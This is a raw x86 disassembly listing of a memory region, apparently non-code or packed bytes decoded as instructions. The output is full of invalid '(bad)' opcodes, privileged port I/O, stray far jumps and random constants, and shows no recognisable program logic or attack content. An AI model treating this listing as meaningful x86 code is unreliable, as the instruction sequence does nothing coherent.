  41f0d6:	add    ch,BYTE PTR [ebx-0x3f3ceb41]
  41f0dc:	or     esp,ecx
  41f0de:	xchg   ebx,eax
  41f0df:	dec    edx
  41f0e0:	jl     0x41f0af
  41f0e2:	dec    edi
  41f0e3:	mov    eax,ds:0x5735dd5b
  41f0e8:	nop
  41f0e9:	(bad)  
  41f0ea:	xor    al,BYTE PTR [ebx-0x7d]
  41f0ed:	add    edi,edi
  41f0ef:	jb     0x41f15c
  41f0f1:	fld    TBYTE PTR [eax-0x7c744eb5]
  41f0f7:	cld    
  41f0f8:	js     0x41f0cd
  41f0fa:	lods   eax,DWORD PTR ds:[esi]
  41f0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0fc:	pushf  
  41f0fd:	addr16 aad 0xc9
  41f100:	ja     0x41f153
  41f102:	xchg   edi,eax
  41f103:	mov    WORD PTR [eax],es
  41f105:	push   eax
  41f106:	or     dh,ah
  41f108:	pop    es
  41f109:	xchg   edx,eax
  41f10a:	adc    bh,BYTE PTR [eax-0x42]
  41f10d:	icebp  
  41f10e:	xchg   edi,eax
  41f10f:	retf   
  41f110:	fistp  WORD PTR [ecx]
  41f112:	in     eax,dx
  41f113:	mov    al,BYTE PTR [esp+esi*2+0x7360ffe1]
  41f11a:	mov    dl,0x52
  41f11c:	dec    esi
  41f11d:	inc    ecx
  41f11e:	popf   
  41f11f:	and    esi,DWORD PTR [eax*4-0x4a9b571f]
  41f126:	scas   eax,DWORD PTR es:[edi]
  41f127:	jo     0x41f183
  41f129:	cmp    ebp,DWORD PTR [ebx-0x15]
  41f12c:	dec    edi
  41f12d:	dec    edx
  41f12e:	or     esp,eax
  41f130:	and    edi,ebp
  41f132:	mov    BYTE PTR [eax+0x2f8d3f46],bl
  41f138:	add    BYTE PTR [eax],0x18
  41f13b:	iret   
  41f13c:	stos   BYTE PTR es:[edi],al
  41f13d:	test   eax,edx
  41f13f:	(bad)  
  41f140:	mov    ebx,0xd1fda09a
  41f145:	pop    eax
  41f146:	add    al,0x87
  41f148:	push   esp
  41f149:	xchg   esp,eax
  41f14a:	clc    
  41f14b:	sbb    ebx,DWORD PTR [ecx-0x465bf11b]
  41f151:	add    cl,BYTE PTR [edx]
  41f153:	pop    esp
  41f154:	aam    0xa6
  41f156:	xchg   edx,eax
  41f157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f158:	out    dx,eax
  41f159:	dec    ecx
  41f15a:	push   ebp
  41f15b:	or     al,0x72
  41f15d:	mov    esp,0xd5f3b64a
  41f162:	jo     0x41f0f2
  41f164:	repnz fnstsw WORD PTR [ecx-0x4e]
  41f168:	hlt    
  41f169:	test   BYTE PTR ds:0xf1cc999c,al
  41f16f:	push   ebx
  41f170:	les    ebx,FWORD PTR [eax]
  41f172:	in     eax,dx
  41f173:	jl     0x41f122
  41f175:	lock pop ebp
  41f177:	mov    edx,0xe9f8fd70
  41f17c:	mov    BYTE PTR [ebx],cl
  41f17e:	out    dx,al
  41f17f:	mov    dl,0x51
  41f181:	daa    
  41f182:	icebp  
  41f183:	push   es
  41f184:	pop    esi
  41f185:	test   BYTE PTR [ebp-0x54],ch
  41f188:	cmc    
  41f189:	popf   
  41f18a:	pop    esp
  41f18b:	inc    esi
  41f18c:	adc    al,ah
  41f18e:	cmp    DWORD PTR [eax],ebx
  41f190:	js     0x41f1d4
  41f192:	mov    ecx,0xd11a86cf
  41f197:	das    
  41f198:	mov    bh,0xbf
  41f19a:	jnp    0x41f129
  41f19c:	push   0xc38945e2
  41f1a1:	dec    edi
  41f1a2:	sub    eax,0x9a473b2e
  41f1a7:	in     al,dx
  41f1a8:	mov    WORD PTR [edx-0x36],es
  41f1ab:	push   ds
  41f1ac:	and    dl,ah
  41f1ae:	es dec edi
  41f1b0:	mov    ebp,0xc6d44589
  41f1b5:	mov    ch,0xf4
  41f1b7:	pop    es
  41f1b8:	sub    edi,DWORD PTR [eax]
  41f1ba:	sub    ebp,DWORD PTR [ebx-0x1a59f59a]
  41f1c0:	add    esp,DWORD PTR [ecx]
  41f1c2:	call   FWORD PTR [eax]
  41f1c4:	pop    edi
  41f1c5:	ins    BYTE PTR es:[edi],dx
  41f1c6:	xchg   esi,eax
  41f1c7:	retf   
  41f1c8:	(bad)
  41f1cc:	add    esi,eax
  41f1ce:	xor    DWORD PTR ds:0xeaa14668,eax
  41f1d4:	pop    edx
  41f1d5:	add    eax,0xd498a429
  41f1da:	adc    ebx,DWORD PTR [edi]
  41f1dc:	add    DWORD PTR [eax+0x66],edx
  41f1df:	lea    eax,[esi+0x19]
  41f1e2:	mov    bh,0x77
  41f1e4:	adc    DWORD PTR [ecx+eax*4],ebx
  41f1e7:	repnz dec eax
  41f1e9:	out    0xfa,al
  41f1eb:	test   al,0x35
  41f1ed:	push   esi
  41f1ee:	sub    BYTE PTR [esi+ebx*8+0x7e],cl
  41f1f2:	mov    esi,0xab3eab51
  41f1f7:	jnp    0x41f268
  41f1f9:	xchg   ebp,eax
  41f1fa:	pushf  
  41f1fb:	jae    0x41f1ee
  41f1fd:	pop    es
  41f1fe:	pop    es
  41f1ff:	in     eax,dx
  41f200:	arpl   cx,bp
  41f202:	popa   
  41f203:	jecxz  0x41f216
  41f205:	loopne 0x41f19d
  41f207:	cmp    al,0x51
  41f209:	or     BYTE PTR cs:[ebp+0x6280f68c],dh
  41f210:	fs ret 0x5e74
  41f214:	adc    al,0xbf
  41f216:	mov    ds:0xb8e99fe8,eax
  41f21b:	and    ebp,DWORD PTR [ebx]
  41f21d:	into   
  41f21e:	push   cs
  41f21f:	stos   BYTE PTR es:[edi],al
  41f220:	pop    esp
  41f221:	jl     0x41f1a7
  41f223:	xchg   esi,eax
  41f224:	and    DWORD PTR [ebp+0x7b],edi
  41f227:	dec    esp
  41f228:	into   
  41f229:	push   edi
  41f22a:	xor    cl,dl
  41f22c:	push   ecx
  41f22d:	adc    eax,DWORD PTR [edx]
  41f22f:	cmp    ebp,0xffffffc4
  41f232:	jbe    0x41f243
  41f234:	push   cs
  41f235:	sar    DWORD PTR [eax],0x9c
  41f238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f239:	nop
  41f23a:	cli    
  41f23b:	into   
  41f23c:	jcxz   0x41f21d
  41f23f:	or     ecx,eax
  41f241:	jg     0x41f272
  41f243:	sbb    DWORD PTR [ecx+0x3],esp
  41f246:	inc    edi
  41f247:	xor    BYTE PTR [esi],dl
  41f249:	inc    edi
  41f24a:	out    0x9d,al
  41f24c:	sbb    BYTE PTR [ecx],0xe8
  41f24f:	sbb    eax,0x3ff17148
  41f254:	mov    ch,BYTE PTR [ebp+0x7e]
  41f257:	fadd   DWORD PTR [ecx]
  41f259:	fs mov eax,0xd8c7740b
  41f25f:	push   ss
  41f260:	out    0xb7,eax
  41f262:	nop
  41f263:	mov    edx,0x69b9d2e4
  41f268:	ret    0xb997
  41f26b:	loope  0x41f2b7
  41f26d:	imul   ebx,DWORD PTR [eax+ebx*2],0x4e
  41f271:	pop    edx
  41f272:	add    dl,al
  41f274:	inc    eax
  41f275:	adc    al,0x27
  41f277:	out    dx,eax
  41f278:	push   eax
  41f279:	add    BYTE PTR [eax+0x75a9b53a],0xec
  41f280:	or     al,BYTE PTR [ecx-0x3eb23688]
  41f286:	cmp    BYTE PTR [esp+edx*1-0x2a058b85],dh
  41f28d:	pop    ss
  41f28e:	popf   
  41f28f:	cmc    
  41f290:	mov    esp,0x1767108f
  41f295:	ss mov ebp,0x2e92ddc2
  41f29b:	je     0x41f2ff
  41f29d:	mov    ah,0x3
  41f29f:	and    al,0x81
  41f2a1:	imul   ebx,DWORD PTR [esi+ebx*4],0x41
  41f2a5:	test   BYTE PTR [eax],ch
  41f2a7:	push   ecx
  41f2a8:	mov    al,ds:0xbf8d9673
  41f2ad:	xlat   BYTE PTR ds:[ebx]
  41f2ae:	lock outs dx,DWORD PTR ds:[esi]
  41f2b0:	inc    ebp
  41f2b1:	mov    ebx,0x9989ea20
  41f2b6:	jno    0x41f247
  41f2b8:	and    eax,0xd9440767
  41f2bd:	add    DWORD PTR [ebx],edi
  41f2bf:	int    0x93
  41f2c1:	out    dx,al
  41f2c2:	adc    eax,0x9fc6fc57
  41f2c7:	inc    ecx
  41f2c8:	xchg   DWORD PTR [edx-0x74],eax
  41f2cb:	fdiv   st,st(2)
  41f2cd:	ins    BYTE PTR es:[edi],dx
  41f2ce:	jo     0x41f285
  41f2d0:	jno    0x41f2c0
  41f2d2:	mov    bl,0x9f
  41f2d4:	retf   
  41f2d5:	stos   BYTE PTR es:[edi],al
  41f2d6:	xor    eax,DWORD PTR [edx-0x5]
  41f2d9:	pop    es
  41f2da:	cmc    
  41f2db:	test   eax,0x7682f54a
  41f2e0:	push   DWORD PTR [ebx-0x62]
  41f2e3:	push   eax
  41f2e4:	(bad)  
  41f2e5:	stos   DWORD PTR es:[edi],eax
  41f2e6:	pop    ss
  41f2e7:	les    esp,FWORD PTR [edi+0x55172b24]
  41f2ed:	fwait
  41f2ee:	xchg   edx,eax
  41f2ef:	mov    ah,0x9a
  41f2f1:	aam    0xc3
  41f2f3:	retf   0x2f1c
  41f2f6:	out    0x14,eax
  41f2f8:	in     eax,dx
  41f2f9:	or     esp,esi
  41f2fb:	js     0x41f290
  41f2fd:	jb     0x41f298
  41f2ff:	fwait
  41f300:	out    0x2,eax
  41f302:	sbb    DWORD PTR [eax-0x212127ed],eax
  41f308:	pop    ss
  41f309:	shl    DWORD PTR [ebx+0x22],1
  41f30c:	mov    ch,0xd
  41f30e:	rsqrtps xmm6,XMMWORD PTR [edx]
  41f311:	adc    ebx,DWORD PTR [edx+0x1f]
  41f314:	enter  0x68bf,0x5
  41f318:	sbb    dl,BYTE PTR [esi+ebp*8+0x2c]
  41f31c:	cdq    
  41f31d:	fisttp WORD PTR [ebp-0x6b675402]
  41f323:	or     BYTE PTR ds:0x28a7fa0a,bl
  41f329:	inc    edi
  41f32a:	push   0xffffffc0
  41f32c:	adc    eax,eax
  41f32e:	or     al,0x8f
  41f330:	shr    BYTE PTR [ebp+0x66c04259],1
  41f336:	push   esp
  41f337:	mov    ebp,0xbbb3e654
  41f33c:	mov    BYTE PTR [ebp-0x2caee29f],0x42
  41f343:	stos   DWORD PTR es:[edi],eax
  41f344:	out    0xf8,al
  41f346:	jmp    0x41f37b
  41f348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f349:	sub    eax,0xff170669
  41f34e:	or     eax,0x5272865e
  41f353:	stc    
  41f354:	loop   0x41f2e5
  41f356:	pusha  
  41f357:	mov    ah,BYTE PTR [ecx+0x45]
  41f35a:	popa   
  41f35b:	sub    ebx,DWORD PTR [eax]
  41f35d:	bound  ebp,QWORD PTR [ecx+0x4b3e4661]
  41f363:	xor    dl,BYTE PTR [eax+0x72]
  41f366:	hlt    
  41f367:	push   edi
  41f368:	es in  al,dx
  41f36a:	push   ebx
  41f36b:	mov    ah,BYTE PTR [ebp+0x6c958d78]
  41f371:	sbb    ah,0x13
  41f374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f375:	fnstenv [ecx+0x7f6a92d9]
  41f37b:	cli    
  41f37c:	mov    ds:0xa54a672c,al
  41f381:	retf   0x6dc5
  41f384:	adc    edi,eax
  41f386:	mov    ebp,0xb004961a
  41f38b:	sbb    al,0xe0
  41f38d:	dec    eax
  41f38e:	ret    0xd4d1
  41f391:	dec    edi
  41f392:	xchg   ebx,eax
  41f393:	sbb    ch,BYTE PTR [ebx+0x74]
  41f396:	hlt    
  41f397:	cmp    ebx,DWORD PTR [eax]
  41f399:	arpl   WORD PTR [ebp+0x2e],bp
  41f39c:	ffree  st(5)
  41f39e:	mov    ds:0xc36d1d5e,eax
  41f3a3:	xor    esp,edx
  41f3a5:	ins    DWORD PTR es:[edi],dx
  41f3a6:	xor    al,0xbc
  41f3a8:	data16 cli 
  41f3aa:	ror    ebx,1
  41f3ac:	fild   QWORD PTR [ebx]
  41f3ae:	stc    
  41f3af:	das    
  41f3b0:	es retf 0x2f2e
  41f3b4:	les    ebp,FWORD PTR [edx+0x71]
  41f3b7:	and    al,0xe8
  41f3b9:	inc    esi
  41f3ba:	repnz lock aad 0x7f
  41f3be:	dec    esi
  41f3bf:	(bad)  
  41f3c0:	mov    ch,0x1c
  41f3c2:	fcmovnbe st,st(5)
  41f3c4:	(bad)  
  41f3c5:	int    0x16
  41f3c7:	clc    
  41f3c8:	(bad)  
  41f3c9:	enter  0x9ec9,0xe4
  41f3cd:	test   ebx,ebx
  41f3cf:	lds    esp,FWORD PTR [eax]
  41f3d1:	cmp    BYTE PTR [edi],cl
  41f3d3:	loopne 0x41f397
  41f3d5:	or     dh,bl
  41f3d7:	push   ss
  41f3d8:	adc    al,0xeb
  41f3da:	xchg   ebx,eax
  41f3db:	aam    0x71
  41f3dd:	add    ebx,DWORD PTR [edi+0x36]
  41f3e0:	mov    es,WORD PTR [edi]
  41f3e2:	rcr    DWORD PTR [esi],0x5e
  41f3e5:	mov    al,0x7
  41f3e7:	(bad)  
  41f3e8:	out    dx,al
  41f3e9:	adc    bh,BYTE PTR [esp+eiz*4-0xb]
  41f3ed:	cmp    eax,0x48bb912b
  41f3f2:	pusha  
  41f3f3:	iret   
  41f3f4:	lock arpl WORD PTR [eax+0x3a67e746],cx
  41f3fb:	fsubr  QWORD PTR [ebp+0x58218a9e]
  41f401:	xchg   esi,eax
  41f402:	clc    
  41f403:	push   edx
  41f404:	sar    bh,cl
  41f406:	jnp    0x41f451
  41f408:	scas   al,BYTE PTR es:[edi]
  41f409:	add    BYTE PTR [ebp+0x74],bl
  41f40c:	add    BYTE PTR [eax],0x75
  41f40f:	add    al,0xe
  41f411:	jne    0x41f437
  41f413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f414:	pop    ds
  41f415:	mov    ds:0xd876f819,al
  41f41a:	(bad)
  41f41e:	mov    ebx,0xb53258e6
  41f423:	push   ebx
  41f425:	out    dx,al
  41f426:	loopne 0x41f3c9
  41f428:	ds in  eax,0xff
  41f42b:	mov    WORD PTR [ebp+0x11b49afd],es
  41f431:	mov    bl,0x17
  41f433:	mov    ecx,0x1807cbd8
  41f438:	stc    
  41f439:	icebp  
  41f43a:	pop    edx
  41f43b:	jno    0x41f3cd
  41f43d:	(bad)  
  41f43e:	jecxz  0x41f3d9
  41f440:	xor    edi,DWORD PTR [ecx]
  41f442:	dec    eax
  41f443:	mov    dl,0x0
  41f445:	add    BYTE PTR [eax],al
  41f447:	add    BYTE PTR [eax],al
  41f449:	add    BYTE PTR [edx+0x4d],dl
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	and    cl,cl
  41f458:	mov    bl,0x95
  41f45a:	rol    BYTE PTR [ebx+0x6820001],cl
  41f460:	add    BYTE PTR [eax],al
  41f462:	es inc ebx
  41f464:	mov    ebp,0xec4c882d
  41f469:	call   0xb271:0x57f74ac5
  41f470:	xor    BYTE PTR [esi+0x3b],ch
  41f473:	xor    eax,0xfe3b7889
  41f478:	add    ch,dl
  41f47a:	out    dx,al
  41f47b:	(bad)  
  41f47c:	shr    BYTE PTR ds:0x1ebb64df,0xdf
  41f483:	push   ss
  41f484:	jo     0x41f4ab
  41f486:	mov    dh,0x15
  41f488:	xor    BYTE PTR [ebx+esi*1+0x50],ch
  41f48c:	dec    esi
  41f48d:	xchg   ebp,eax
  41f48e:	scas   al,BYTE PTR es:[edi]
  41f48f:	icebp  
  41f490:	std    
  41f491:	gs cwde 
  41f493:	dec    ecx
  41f494:	rcl    ch,0xe4
  41f497:	adc    DWORD PTR [edx+0x6c],edi
  41f49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f49b:	int    0x6
  41f49d:	stc    
  41f49e:	adc    BYTE PTR [esi-0x58],0x5b
  41f4a2:	in     al,0x85
  41f4a4:	jge    0x41f51a
  41f4a6:	jb     0x41f444
  41f4a8:	sub    eax,0x4a9f9bff
  41f4ad:	inc    esi
  41f4ae:	xor    eax,0x7696f96f
  41f4b3:	retf   0xf141
  41f4b6:	or     DWORD PTR [ecx+0x7781e2a1],edx
  41f4bc:	ror    DWORD PTR [eax+0x14],cl
  41f4bf:	idiv   BYTE PTR [ebx+ecx*1+0x7db5d078]
  41f4c6:	cmp    edi,DWORD PTR [ecx]
  41f4c8:	push   ebx
  41f4c9:	loopne 0x41f470
  41f4cb:	mov    ds:0xb2fd08d9,al
  41f4d0:	popa   
  41f4d1:	pop    esp
  41f4d2:	fadd   DWORD PTR [edx-0xf]
  41f4d5:	pusha  
  41f4d6:	xchg   esi,ebp
  41f4d8:	adc    DWORD PTR [edi],ebp
  41f4da:	pop    edi
  41f4db:	jl     0x41f4b5
  41f4dd:	(bad)  
  41f4de:	aad    0xed
  41f4e0:	cli    
  41f4e1:	mov    ds:0xd7a71f16,eax
  41f4e6:	aas    
  41f4e7:	popa   
  41f4e8:	add    BYTE PTR [esi],bh
  41f4ea:	mov    ch,0x21
  41f4ec:	gs fdivp st(6),st
  41f4ef:	push   0xabdc2f7
  41f4f4:	sbb    eax,0x9f7f3cf8
  41f4f9:	cmp    eax,0x9822e03a
  41f4fe:	xchg   edi,edx
  41f500:	daa    
  41f501:	rcr    dl,cl
  41f503:	jmp    0x512b866b
  41f508:	xchg   ebx,esi
  41f50a:	adc    bh,bh
  41f50c:	enter  0xbbab,0x7
  41f510:	mov    dh,0x26
  41f512:	lahf   
  41f513:	shl    DWORD PTR [eax+eax*2+0x692e8aef],cl
  41f51a:	lods   eax,DWORD PTR ds:[esi]
  41f51b:	push   eax
  41f51c:	sti    
  41f51d:	jb     0x41f56c
  41f51f:	adc    eax,0xae9af9a9
  41f524:	or     eax,0xdc4806fe
  41f529:	rcr    DWORD PTR [edi],0x5f
  41f52c:	arpl   di,di
  41f52e:	je     0x41f58f
  41f530:	int    0x8e
  41f532:	in     eax,dx
  41f533:	jb     0x41f4fc
  41f535:	fldcw  WORD PTR [ecx]
  41f537:	and    DWORD PTR [eax-0x4],edi
  41f53a:	pop    esp
  41f53b:	test   dh,0x5f
  41f53e:	aas    
  41f53f:	xor    ecx,ebp
  41f541:	or     eax,0xcaceee3c
  41f546:	and    edi,esi
  41f548:	(bad)  
  41f54a:	mov    eax,0xb8a4cabd
  41f550:	mov    al,0xd8
  41f552:	cmp    edi,eax
  41f554:	mov    bh,0xd5
  41f556:	mov    BYTE PTR [edi],0x51
  41f559:	dec    edx
  41f55a:	ds (bad) 
  41f55c:	jmp    0x2beb:0xadb8234b
  41f563:	sub    dh,al
  41f565:	adc    BYTE PTR [esp+esi*8+0x47a8745],ah
  41f56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f56d:	sub    edi,DWORD PTR [eax+ecx*8]
  41f570:	mov    ebx,0x58949091
  41f575:	fdivrp st(4),st
  41f577:	or     ebx,DWORD PTR [esi+0x8d9d1d2]
  41f57d:	sbb    ebx,ebx
  41f57f:	mov    ah,0x8a
  41f581:	sub    BYTE PTR [edi-0x10],al
  41f584:	arpl   WORD PTR [ebx],di
  41f586:	cmp    ebp,ecx
  41f588:	push   ebp
  41f589:	repz aad 0xcb
  41f58c:	fbstp  TBYTE PTR [ebx]
  41f58e:	push   esp
  41f58f:	out    dx,al
  41f590:	or     eax,0x287bd43f
  41f595:	push   ds
  41f596:	or     cx,di
  41f599:	mov    esp,?
  41f59b:	(bad)  [esp+edx*8+0x728552d4]
  41f5a2:	xchg   esi,ebx
  41f5a4:	dec    eax
  41f5a5:	ins    DWORD PTR es:[edi],dx
  41f5a6:	mov    ?,WORD PTR [esi-0x135915e1]
  41f5ac:	and    eax,0xea282122
  41f5b1:	in     al,0x86
  41f5b3:	xchg   BYTE PTR [ebx+0x1],bh
  41f5b6:	or     DWORD PTR [eax],edx
  41f5b8:	mov    ds:0xe59132f3,eax
  41f5bd:	lods   eax,DWORD PTR ds:[esi]
  41f5be:	mov    ah,0xbd
  41f5c0:	ins    BYTE PTR es:[edi],dx
  41f5c1:	inc    edi
  41f5c2:	sbb    eax,0xd8cbbbcd
  41f5c7:	mov    ch,0xf6
  41f5c9:	xchg   edx,eax
  41f5ca:	push   ds
  41f5cb:	push   es
  41f5cc:	mov    ebx,0x55ad1127
  41f5d1:	(bad)  
  41f5d3:	jne    0x41f5c0
  41f5d5:	and    DWORD PTR [edi-0x748ab7db],eax
  41f5db:	mov    al,0x49
  41f5dd:	test   eax,0x10579646
  41f5e2:	fadd   QWORD PTR [ebp-0x26]
  41f5e5:	pusha  
  41f5e6:	xchg   edi,eax
  41f5e7:	out    0x31,al
  41f5e9:	or     eax,0x2108b23e
  41f5ee:	jecxz  0x41f589
  41f5f0:	addr16 or al,0x6c
  41f5f3:	rcl    dl,cl
  41f5f5:	add    ch,BYTE PTR ds:0x12a8f928
  41f5fb:	rol    DWORD PTR [ebp+0x40],1
  41f5fe:	mov    dh,0x19
  41f600:	dec    ecx
  41f601:	jle    0x41f5c6
  41f603:	cs jmp 0xc31c491c
  41f609:	push   ss
  41f60a:	imul   esp,DWORD PTR [edx-0x71],0xffffff99
  41f60e:	xchg   DWORD PTR [eax-0x41f43427],eax
  41f614:	mov    ch,0xd0
  41f616:	push   0xffffff83
  41f618:	cli    
  41f619:	cs cwde 
  41f61b:	cmp    DWORD PTR [ecx-0x5e],0x37
  41f61f:	sti    
  41f620:	dec    ebp
  41f621:	outs   dx,BYTE PTR ds:[esi]
  41f622:	xlat   BYTE PTR ds:[ebx]
  41f623:	pop    ecx
  41f624:	aam    0x50
  41f626:	retf   0x8e9f
  41f629:	and    eax,0x2fd808d7
  41f62e:	bnd jge 0x41f608
  41f631:	sub    al,0xb2
  41f633:	popa   
  41f634:	mov    esp,0x9116b243
  41f639:	xchg   edi,eax
  41f63a:	and    eax,0x5b9b9d2a
  41f63f:	dec    edi
  41f640:	inc    edx
  41f641:	bound  edi,QWORD PTR [edi]
  41f643:	mov    ah,0x28
  41f645:	jnp    0x41f640
  41f647:	idiv   DWORD PTR [edi-0x38]
  41f64a:	inc    eax
  41f64b:	jmp    0x436d:0xdf049e4e
  41f652:	test   DWORD PTR [edx],ebp
  41f654:	jb     0x41f674
  41f656:	aam    0x94
  41f658:	dec    esi
  41f659:	jo     0x41f699
  41f65b:	push   eax
  41f65c:	pop    ebp
  41f65d:	pop    esi
  41f65e:	inc    edx
  41f65f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f660:	neg    BYTE PTR [eax-0x45848cc9]
  41f666:	mov    eax,ds:0xd115044e
  41f66b:	and    al,0xd9
  41f66d:	mov    BYTE PTR [eax-0x42],ch
  41f670:	loopne 0x41f69c
  41f672:	sar    dh,1
  41f674:	jecxz  0x41f65d
  41f676:	adc    ebx,DWORD PTR [ebx]
  41f678:	xor    ebp,edx
  41f67a:	jmp    0xce10:0x57930b47
  41f681:	xchg   ebx,eax
  41f682:	mov    dh,0x21
  41f684:	gs sub al,0xde
  41f687:	xor    DWORD PTR [edi],edx
  41f689:	aas    
  41f68a:	xchg   ecx,eax
  41f68b:	mov    cl,0xff
  41f68d:	xor    ebx,DWORD PTR [esi]
  41f68f:	pop    eax
  41f690:	cwde   
  41f691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f692:	push   edi
  41f693:	xor    BYTE PTR [eax-0x336d05b2],ch
  41f699:	add    DWORD PTR [eax],ecx
  41f69b:	jne    0x41f70b
  41f69d:	test   al,0xad
  41f69f:	jo     0x41f6ab
  41f6a1:	sub    edx,DWORD PTR [eax]
  41f6a3:	in     eax,0x7a
  41f6a5:	pop    esp
  41f6a6:	mov    BYTE PTR [esi+0xf],dl
  41f6a9:	pop    eax
  41f6aa:	out    0xce,al
  41f6ac:	clc    
  41f6ad:	and    dl,dl
  41f6af:	mov    ds:0x8c8067ec,eax
  41f6b4:	sbb    eax,esp
  41f6b6:	mov    DWORD PTR [eax-0x5e],eax
  41f6b9:	aam    0x8a
  41f6bb:	mov    ch,0x6b
  41f6bd:	retf   
  41f6be:	inc    ecx
  41f6bf:	mov    esp,DWORD PTR [edx+edx*1]
  41f6c2:	inc    edx
  41f6c3:	(bad)  
  41f6c4:	imul   ecx,DWORD PTR [ebp+0x3daafbc3],0x75ea731e
  41f6ce:	xor    bh,BYTE PTR [esi]
  41f6d0:	cld    
  41f6d1:	push   esi
  41f6d2:	into   
  41f6d3:	fwait
  41f6d4:	mov    bl,0x5f
  41f6d6:	jbe    0x41f675
  41f6d8:	cli    
  41f6d9:	mov    esi,0x5dd5ec71
  41f6de:	fs iret 
  41f6e0:	scas   eax,DWORD PTR es:[edi]
  41f6e1:	jnp    0x41f6c9
  41f6e3:	sub    DWORD PTR [ebx-0x19],edi
  41f6e6:	adc    eax,DWORD PTR cs:[edx+0x5c]
  41f6ea:	mov    ah,0x44
  41f6ec:	jecxz  0x41f768
  41f6ee:	cmc    
  41f6ef:	push   cs
  41f6f0:	stos   DWORD PTR es:[edi],eax
  41f6f1:	push   esp
  41f6f2:	pop    esp
  41f6f3:	mov    WORD PTR [esi],gs
  41f6f5:	outs   dx,BYTE PTR ds:[esi]
  41f6f6:	das    
  41f6f7:	popf   
  41f6f8:	shl    BYTE PTR [edi],0x8e
  41f6fb:	scas   eax,DWORD PTR es:[edi]
  41f6fc:	jb     0x41f6ff
  41f6fe:	cmp    al,0x60
  41f700:	scas   al,BYTE PTR es:[edi]
  41f701:	imul   esp,DWORD PTR [edx],0xa
  41f704:	or     BYTE PTR [eax-0x45],ch
  41f707:	lahf   
  41f708:	aam    0x55
  41f70a:	stos   DWORD PTR es:[edi],eax
  41f70b:	fisttp DWORD PTR [edx-0x6a6c62d7]
  41f711:	iret   
  41f712:	pop    eax
  41f713:	out    0x3a,eax
  41f715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f716:	loope  0x41f796
  41f718:	(bad)  
  41f719:	cs loope 0x41f71f
  41f71c:	dec    ebx
  41f71d:	lods   eax,DWORD PTR ds:[esi]
  41f71e:	push   ebx
  41f71f:	sbb    bl,0x75
  41f722:	ja     0x41f764
  41f724:	jae    0x41f704
  41f726:	mov    esp,0x421e3617
  41f72b:	(bad)  
  41f72c:	cmp    eax,0x558905db
  41f731:	and    ebx,DWORD PTR [eax+0x7c53259]
  41f737:	aam    0x66
  41f739:	outs   dx,BYTE PTR ds:[esi]
  41f73a:	adc    al,0xb7
  41f73c:	stos   DWORD PTR es:[edi],eax
  41f73d:	iret   
  41f73e:	imul   esi,ebp,0xffffff88
  41f741:	sbb    BYTE PTR [ebp+0x3f],al
  41f744:	xor    edx,edx
  41f746:	mov    bl,0xae
  41f748:	stos   BYTE PTR es:[edi],al
  41f749:	les    ebx,FWORD PTR [eax]
  41f74b:	stc    
  41f74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f74d:	push   esp
  41f74e:	adc    eax,edx
  41f750:	xor    DWORD PTR [edx+ecx*1+0x8763c32],edi
  41f757:	push   esp
  41f758:	xchg   ebx,eax
  41f759:	je     0x41f731
  41f75b:	pushf  
  41f75c:	in     eax,dx
  41f75d:	lods   al,BYTE PTR ds:[esi]
  41f75e:	ss mov edi,0x9514a429
  41f764:	mov    WORD PTR [ebp-0x4d442d57],es
  41f76a:	rcr    BYTE PTR [ebx+eiz*8+0x7d66200b],1
  41f771:	push   0xfffffffc
  41f773:	sub    eax,0xa6ce26fa
  41f778:	sbb    ebx,DWORD PTR [ecx]
  41f77a:	mov    ds:0xe2bdc071,eax
  41f77f:	aas    
  41f780:	inc    esp
  41f781:	into   
  41f782:	mov    dl,0xea
  41f784:	out    0x52,eax
  41f786:	mov    eax,ds:0x464b8d2a
  41f78b:	push   edi
  41f78c:	cmp    DWORD PTR [ebx],eax
  41f78e:	jg     0x41f782
  41f790:	pop    ecx
  41f791:	inc    esp
  41f792:	or     eax,0x4f40edae
  41f797:	xchg   bl,ah
  41f799:	jle    0x41f794
  41f79b:	test   al,0xa
  41f79d:	call   0xf5e22fbb
  41f7a2:	mov    esp,0x814c2ffe
  41f7a7:	call   0x2a5b:0x8a181793
  41f7ae:	add    DWORD PTR [ecx],0x7e
  41f7b1:	pop    ds
  41f7b2:	and    dl,BYTE PTR [ebx+ebp*1+0x14]
  41f7b6:	cld    
  41f7b7:	xchg   edi,eax
  41f7b8:	mov    gs,WORD PTR [edx-0x2ad42c35]
  41f7be:	ret    0xdc13
  41f7c1:	mov    edx,0xad9d794f
  41f7c6:	fnstenv [esi-0x6c089693]
  41f7cc:	push   ecx
  41f7cd:	xchg   edi,eax
  41f7ce:	dec    ecx
  41f7cf:	cmp    eax,0x92d7ce00
  41f7d4:	outs   dx,BYTE PTR ds:[esi]
  41f7d5:	push   edi
  41f7d6:	not    BYTE PTR [esi-0x52f640c3]
  41f7dc:	cwde   
  41f7dd:	call   0x2ae2:0x45fbf6e
  41f7e4:	sbb    DWORD PTR [edi],0x0
  41f7e7:	nop
  41f7e8:	das    
  41f7e9:	push   ss
  41f7ea:	cmp    BYTE PTR [edx],al
  41f7ec:	ret    
  41f7ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7ee:	pop    ds
  41f7ef:	imul   eax,DWORD PTR [esi+0x720f9753],0xffffff81
  41f7f6:	jle    0x41f82b
  41f7f8:	sub    DWORD PTR [edi],eax
  41f7fa:	add    al,0xfb
  41f7fc:	test   al,0x5c
  41f7fe:	(bad)  
  41f7ff:	or     edx,ecx
  41f801:	stos   BYTE PTR es:[edi],al
  41f802:	xor    al,0x2d
  41f804:	push   esi
